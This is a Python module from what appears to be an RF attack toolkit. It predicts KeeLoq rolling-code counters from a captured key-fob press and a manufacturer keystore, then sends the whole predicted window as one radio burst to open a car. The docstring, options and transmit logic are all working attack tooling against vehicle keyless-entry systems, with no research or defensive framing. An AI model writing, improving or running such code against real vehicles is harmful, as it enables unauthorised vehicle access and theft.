"""Counter-prediction injection: sweep predicted codes as one fast train.

``car.sweep`` writes a directory of frames and ``car.replay`` plays them one at
a time with interpreter latency between every transmit — usually too slow, the
car has moved on (or the owner pressed again) before the window is hit. This
module predicts the same counters but *injects* them as a single pre-built
marquee train, so the whole window goes out in one continuous burst.

Use it immediately after capturing a press: the car's tracker will sit a few
hundred ahead of the capture, so ``START`` + ``WINDOW`` bound the hunt.
"""

from __future__ import annotations

import os

from omni.car import analysis
from omni.car.modules._base import CarModule
from omni.core import config, console
from omni.core.module import Option
from omni.rf import marquee

__all__ = ["CounterInject"]


class CounterInject(CarModule):
    NAME = "car.inject"
    DESCRIPTION = "Predict rolling counters and fire the whole window in one train"
    OPTIONS = (Option("SUB", "captured KeeLoq .sub file", "", required=True),
               Option("START", "explicit start counter (hex or dec)"),
               Option("WINDOW", "how many counters to try", "256"),
               Option("STEP", "skip every Nth counter", "1"),
               Option("COPIES", "copies per counter", "1"),
               Option("GAP", "extra dead air between bursts, ms", "0"),
               Option("KEYSTORE", "manufacturer keystore path"),
               Option("SAVE", "keep the flattened train", "true",
                      choices=("true", "false")))

    def execute(self) -> dict:
        sub = self.load_sub()
        if sub.protocol != "KeeLoq":
            raise ValueError(f"counter prediction needs a KeeLoq capture, "
                             f"got {sub.protocol!r}")
        store = self.keystore(self.get("KEYSTORE") or None)
        start = self.get("START")
        start_cnt = int(start, 0) if start else None
        window = max(1, self.get_int("WINDOW", 256))
        subs, counters = analysis.sweep(sub, store, start=start_cnt,
                                        count=window,
                                        step=self.get_int("STEP", 1))
        if not counters:
            console.warn("no counters generated — is the manufacturer key known?")
            return {"sent": 0, "counters": [], "demo": True}

        frames: list[marquee.Frame] = []
        for item in subs:
            found = marquee.frames_from_sub(item)
            if found:
                frames.append(found[0])
        if not frames:
            console.warn("sweep produced no transmittable frames")
            return {"sent": 0, "counters": counters, "demo": True}

        slots = marquee.plan(frames, "capture", self.get_int("COPIES", 1))
        gap = marquee.clamp_gap(self.get_int("GAP", 0))
        budget = marquee.timing(slots, gap)
        console.kv([("counters", f"{counters[0]:04X}..{counters[-1]:04X}"),
                    ("frames", str(budget["frames"])),
                    ("air", f"{budget['total_ms']:.0f} ms")])
        if budget["total_ms"] > 8000:
            console.warn(f"{budget['total_ms'] / 1000:.1f}s of air — raise STEP "
                         "or lower WINDOW if the car times out")

        flat = marquee.to_sub(slots, gap)
        saved = ""
        if self.get_bool("SAVE", True):
            saved = os.path.join(
                config.output_dir("car/inject"),
                f"counter_{int(flat.frequency / 1000)}_"
                f"{counters[0]:04X}-{counters[-1]:04X}.sub")
            flat.save(saved)
            console.info(f"train kept: {saved}")

        rig = self.rig()
        try:
            sent = rig.tx().send_subfile(flat)
        finally:
            rig.close()
        console.ok(f"injected {sent} train(s) across {budget['frames']} "
                   f"predicted counter(s)")
        return {"sent": sent, "counters": counters, "frames": budget["frames"],
                "air_ms": budget["total_ms"], "saved": saved, "demo": rig.demo}
